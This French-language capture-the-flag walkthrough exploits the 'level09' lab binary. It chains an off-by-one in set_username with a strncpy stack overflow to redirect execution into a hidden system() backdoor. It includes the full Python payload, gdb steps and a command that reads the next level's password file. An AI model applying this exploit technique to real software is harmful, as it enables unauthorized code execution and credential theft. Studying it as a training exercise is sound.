# Level 09 — Walkthrough

## Analyse du binaire

Le binaire expose une petite messagerie. Le flux d'exécution est :

```
main()
  └─ handle_msg()
       ├─ set_username()   ← saisie du nom
       └─ set_msg()        ← saisie du message
```

Une fonction `secret_backdoor()` est présente dans le binaire mais jamais appelée :
```c
void secret_backdoor(void) {
    char cmd[128];
    fgets(cmd, 0x80, stdin);
    system(cmd);   // exécute n'importe quelle commande
}
```

L'objectif est de détourner le flot d'exécution pour sauter dans `secret_backdoor`.

---

## Structure en mémoire

```c
struct message {
    char msg[140];     // offset 0x00  (0   → 139)
    char username[40]; // offset 0x8c  (140 → 179)
    int  msg_len;      // offset 0xb4  (180 → 183)
};
```

Cette structure est allouée comme variable locale dans `handle_msg`, donc sur la **stack**.

---

## Vulnérabilité 1 — Off-by-one dans set_username

```c
for (i = 0; i < 0x29 && buf[i] != '\0'; i++)
    m->username[i] = buf[i];
```

- `username` fait **40 octets** (indices 0 à 39)
- La boucle tourne tant que `i < 0x29` soit `i < 41`
- Donc `i` peut valoir **0, 1, 2, … 40** → **41 itérations**
- La 41ème écriture (`username[40]`) déborde d'un octet sur `msg_len`

Sur un système little-endian, `msg_len` vaut initialement `0x8c` (`0x0000008c` en mémoire).
L'octet de poids faible (le premier en mémoire) est écrasé par `username[40]`.

En choisissant le 41ème caractère du username, on contrôle la valeur de `msg_len`.

---

## Vulnérabilité 2 — Overflow dans set_msg

```c
void set_msg(struct message *m) {
    char buf[1024];
    fgets(buf, 0x400, stdin);
    strncpy(m->msg, buf, m->msg_len);  // copie msg_len octets
}
```

`strncpy` copie exactement `msg_len` octets de `buf` vers `m->msg`.  
Si `msg_len` est suffisamment grand, la copie déborde hors de `msg[140]` et peut écraser
ce qui se trouve au-delà sur la stack : `username`, `msg_len`, puis le saved RBP et enfin
l'**adresse de retour** de `handle_msg`.

---

## Calcul de l'offset

### Layout de la stack frame de handle_msg

`handle_msg` alloue `0xc0` (192) octets pour ses variables locales (`sub $0xc0, %rsp`).

```
adresses hautes
┌──────────────────────┐  rbp + 8
│   return address     │  ← cible : on veut y écrire l'adresse de secret_backdoor
├──────────────────────┤  rbp + 0
│   saved RBP          │  (8 octets)
├──────────────────────┤  rbp - 8
│   padding compilateur│  (8 octets, alignement)
├──────────────────────┤  rbp - 16 = rbp - 0x10
│   msg_len  [4]       │  rbp - 0x0c
├──────────────────────┤
│   username [40]      │
├──────────────────────┤
│   msg[140]           │  ← m.msg[0] = rbp - 0xc0
└──────────────────────┘
adresses basses
```

### Distance de m.msg[0] à la return address

```
(rbp + 8) - (rbp - 0xc0) = 0xc0 + 8 = 192 + 8 = 200 octets
```

Il faut donc écrire **200 octets de padding** avant l'adresse de retour.

Le payload complet pour `set_msg` fait : `200 + 8 = 208 octets`

### Valeur de msg_len nécessaire

`msg_len` doit valoir au minimum **208** pour que `strncpy` copie assez loin.

`208 = 0xd0` → le 41ème octet du username doit être `\xd0`.

---

## Trouver l'adresse de secret_backdoor

Le binaire est PIE : `objdump` ou `disas` sans run montrent un offset (`0x88c`), pas
l'adresse réelle. Il faut lancer le binaire pour obtenir l'adresse chargée :

```
gdb level09
(gdb) break main
(gdb) run
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

Adresse : **`0x55555555488c`**

En little-endian sur 8 octets : `\x8c\x48\x55\x55\x55\x55\x00\x00`

---

## Trouver l'offset sans calcul mental — méthode GDB directe

Le calcul théorique (taille de struct + padding compilateur) est piégeux car le compilateur
peut ajouter des octets d'alignement invisibles dans le source. La méthode fiable est de
laisser GDB calculer la distance directement sur les registres.

**1. Repérer l'allocation de la stack frame dans le disassembly :**
```
disas handle_msg
# chercher : sub $0xc0, %rsp  → m.msg[0] est à rbp - 0xc0
```

**2. Poser un breakpoint sur le `retq` de `handle_msg` et lancer normalement :**
```
(gdb) break *0x555555554931
(gdb) run
```
(taper n'importe quoi aux deux prompts pour atteindre le breakpoint)

**3. Calculer l'offset exact en une commande :**
```
(gdb) p $rsp - ($rbp - 0xc0)
```

- `$rsp` au moment du `retq` = adresse où est stockée la return address
- `$rbp - 0xc0` = adresse de `m.msg[0]`
- La différence = offset exact, ici **200**

C'est ce qui révèle les 8 octets de padding compilateur qu'on ne voit pas dans le source.

---

## Vérification du payload en GDB

Pour confirmer que le return address est bien écrasé avec la bonne valeur :

```
(gdb) break *0x555555554931   # adresse du retq de handle_msg
(gdb) run < <(python -c "import sys; sys.stdout.write('A'*40 + '\xd0' + '\n' + 'B'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n')")
(gdb) x/4gx $rsp              # inspecter ce qui sera chargé dans RIP
```

---

## Construction du payload

### Étape 1 — Username (41 octets)

```
'A' * 40  +  '\xd0'
```

- 40 octets quelconques pour remplir `username`
- `\xd0` (208) écrase le byte de poids faible de `msg_len`
- Résultat : `msg_len = 208`

### Étape 2 — Message (208 octets)

```
'B' * 200  +  '\x8c\x48\x55\x55\x55\x55\x00\x00'
```

- 200 octets pour remplir jusqu'à la return address (msg, username, msg_len, padding, saved RBP)
- 8 octets = adresse de `secret_backdoor` en little-endian

---

## Commande d'exploit

Le `(cmd ; cat)` est indispensable : après le saut vers `secret_backdoor`, la fonction
appelle `fgets(cmd, 0x80, stdin)`. Si stdin est fermé (pipe simple), elle lit EOF et
`system("")` ne fait rien. Avec `cat`, stdin reste ouvert et on peut taper la commande.

```bash
(python -c "import sys; sys.stdout.write('A'*40 + '\xd0' + '\n' + 'B'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n')"; cat) | ./level09
```

Puis taper :
```
cat /home/users/end/.pass
```

---

## Résumé de la chaîne d'exploitation

```
set_username()
  → off-by-one : username[40] = '\xd0'
  → msg_len passe de 140 à 208

set_msg()
  → strncpy copie 208 octets dans msg[140]
  → déborde sur username, msg_len, padding, saved RBP
  → écrase la return address de handle_msg avec l'adresse de secret_backdoor

handle_msg retourne
  → saute dans secret_backdoor()
  → fgets lit "/bin/sh" ou "cat ..."
  → system() exécute la commande
```
